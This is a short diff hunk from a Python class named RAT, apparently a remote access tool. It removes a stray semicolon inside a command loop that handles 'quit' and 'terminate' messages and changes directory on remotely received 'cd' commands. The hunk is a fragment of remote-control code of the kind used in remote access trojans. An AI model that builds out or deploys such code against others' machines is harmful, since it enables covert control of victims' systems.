@@ -246,7 +246,7 @@ class RAT:
 					# check for quit
 					if(data == 'quit' or data == 'terminate'):
 						cls.send('Quitted...')
-						break;
+						break
 					# check for change directory
 					elif(data.startswith('cd ')):
 						os.chdir(data[3:])
